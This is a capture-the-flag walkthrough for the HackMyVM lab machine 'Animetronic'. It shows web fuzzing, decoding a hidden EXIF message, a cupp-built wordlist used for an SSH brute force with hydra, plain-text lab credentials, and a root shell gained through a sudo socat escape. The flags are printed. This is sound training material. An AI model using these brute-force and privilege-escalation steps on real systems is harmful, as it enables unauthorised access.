# Animetronic

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.121:22
Open 10.0.2.121:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.121
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKgepaIPacTr/sLRkgtx54GMaYI3oL3F7s4UwXLZ7XqLyzNC1NdKkIWNLzcRsgb3dQ3YP7N+o9HjaW1XeA754XE=
|   256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAAFLsqIKtI4BKKhEdVXr1KpLQqhxysxtbGzpVcP+1F
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Animetronic
|_http-favicon: Unknown favicon MD5: AF5214722D8F88F2F9066DC9171DFCA6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP 

![writeup.png](/assets/pentest/hackmyvm/animetronic/writeup.png)

### Web Fuzzing

```bash
└─$ feroxbuster -u http://10.0.2.121 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -x .php
# Nothing
└─$ feroxbuster -u http://10.0.2.121 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -x .php
# Nothing
└─$ feroxbuster -u http://10.0.2.121 --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
301      GET        9l       28w      306c http://10.0.2.121/img => http://10.0.2.121/img/
200      GET        4l     1058w    69597c http://10.0.2.121/js/jquery-slim.min.js
200      GET       52l      340w    24172c http://10.0.2.121/img/favicon.ico
200      GET     2761l    15370w  1300870c http://10.0.2.121/img/logo.png
200      GET       52l      202w     2384c http://10.0.2.121/
301      GET        9l       28w      305c http://10.0.2.121/js => http://10.0.2.121/js/
301      GET        9l       28w      313c http://10.0.2.121/staffpages => http://10.0.2.121/staffpages/
```

Hidden directory, but not accessible
```bash
└─$ curl http://10.0.2.121/staffpages -L -I
HTTP/1.1 301 Moved Permanently
Date: Tue, 02 Dec 2025 09:20:13 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://10.0.2.121/staffpages/
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 403 Forbidden
Date: Tue, 02 Dec 2025 09:20:13 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
```

```bash
└─$ feroxbuster -u http://10.0.2.121/staffpages --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
301      GET        9l       28w      313c http://10.0.2.121/staffpages => http://10.0.2.121/staffpages/
200      GET      728l     3824w   287818c http://10.0.2.121/staffpages/new_employees
```

![writeup-1.png](/assets/pentest/hackmyvm/animetronic/writeup-1.png)

### Hidden Files

```bash
└─$ exiftool <(curl http://10.0.2.121/staffpages/new_employees -so-)
ExifTool Version Number         : 13.25
File Name                       : 11
Directory                       : /proc/self/fd
File Modification Date/Time     : 2025:12:02 04:23:22-05:00
File Access Date/Time           : 2025:12:02 04:23:22-05:00
File Inode Change Date/Time     : 2025:12:02 04:23:22-05:00
File Permissions                : prw-------
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
Image Width                     : 703
Image Height                    : 1136
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 703x1136
Megapixels                      : 0.799
```

Wtf?
```bash
└─$ echo 'ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=' | base64 -d
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
```

- [https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)

![writeup-2.png](/assets/pentest/hackmyvm/animetronic/writeup-2.png)

- [https://www.dcode.fr/upside-down-writing](https://www.dcode.fr/upside-down-writing)

![writeup-3.png](/assets/pentest/hackmyvm/animetronic/writeup-3.png)

It says "**message for michael**"

```bash
└─$ curl 'http://10.0.2.121/staffpages/message%20for%20michael'
<title>404 Not Found</title>
...
└─$ curl 'http://10.0.2.121/staffpages/message_for_michael'
Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file

personal_info.txt
```

### Password Bruteforce

```bash
└─$ curl 'http://10.0.2.121/staffpages/personal_info.txt'
name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming
```

Feeding the file to cupp was not successful for password.
```bash
└─$ curl 'http://10.0.2.121/staffpages/personal_info.txt' -Os
└─$ cupp -w ./personal_info.txt
> Do you want to concatenate all words from wordlist? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:
> Hyperspeed Print? (Y/n) :
[+] Now load your pistolero with ./personal_info.txt.cupp.txt and shoot! Good luck!

└─$ hydra -l michael -P personal_info.txt.cupp.txt 10.0.2.121 ssh -t 64 -I
1 of 1 target completed, 0 valid password found
```

Create wordlist with interactive questions
```bash
└─$ cupp -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Michael
> Surname:
> Nickname:
> Birthdate (DDMMYYYY): 19101996

> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):

> Child's name: Ahmed Yasser Adam
> Child's nickname:
> Child's birthdate (DDMMYYYY):

> Pet's name:
> Company name:

> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: swimming
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 776 words.
> Hyperspeed Print? (Y/n) :
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```

Success
```bash
└─$ hydra -l michael -P michael.txt 10.0.2.121 ssh -t 64 -I
[22][ssh] host: 10.0.2.121   login: michael   password: leahcim1996
```

## SSH (michael)

::: info Creds
`michael:leahcim1996`
:::

```bash
└─$ sshpass -p 'leahcim1996' ssh michael@10.0.2.121
michael@animetronic:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael)
```

## Privilege Escalation (henry)

We can read files inside `henry`'s home directory
```bash
michael@animetronic:/home/henry$ ls -alh
total 56K
drwxrwxr-x   6 henry henry 4.0K Nov 27  2023 .
drwxr-xr-x   4 root  root  4.0K Nov 27  2023 ..
-rwxrwxr-x   1 henry henry   30 Jan  5  2024 .bash_history
-rwxrwxr-x   1 henry henry  220 Jan  6  2022 .bash_logout
-rwxrwxr-x   1 henry henry 3.7K Jan  6  2022 .bashrc
drwxrwxr-x   2 henry henry 4.0K Nov 27  2023 .cache
drwxrwxr-x   3 henry henry 4.0K Nov 27  2023 .local
drwxrwxr-x 402 henry henry  12K Nov 27  2023 .new_folder
-rwxrwxr-x   1 henry henry  807 Jan  6  2022 .profile
drwxrwxr-x   2 henry henry 4.0K Nov 27  2023 .ssh
-rwxrwxr-x   1 henry henry    0 Nov 27  2023 .sudo_as_admin_successful
-rwxrwxr-x   1 henry henry  119 Nov 27  2023 Note.txt
-rwxrwxr-x   1 henry henry   33 Nov 27  2023 user.txt
```

```bash
michael@animetronic:/home/henry$ cat Note.txt
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
michael@animetronic:/home/henry$ find / -name aGVucnlwYXNzd29yZC50eHQK 2>/dev/null
# Nothing

michael@animetronic:/home/henry$ echo aGVucnlwYXNzd29yZC50eHQK | base64 -d
henrypassword.txt
michael@animetronic:/home/henry$ find / -name henrypassword.txt -ls 2>/dev/null
   391400      4 -rwxrwxr-x   1 henry    henry          13 Nov 27  2023 /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
```

```bash
michael@animetronic:/home/henry$ cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
IHateWilliam
```

::: info Creds
`henry:IHateWilliam`
:::

### User.txt

```bash
henry@animetronic:~$ cat user.txt
0833990328464efff1de6cd93067cfb7
```

## Privilege Escalation (root)

```bash
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

- [https://gtfobins.github.io/gtfobins/socat/#sudo](https://gtfobins.github.io/gtfobins/socat/#sudo)

```bash
henry@animetronic:~$ sudo socat stdin exec:/bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
cat /root/root.txt
153a1b940365f46ebed28d74f142530f280a2c0a
```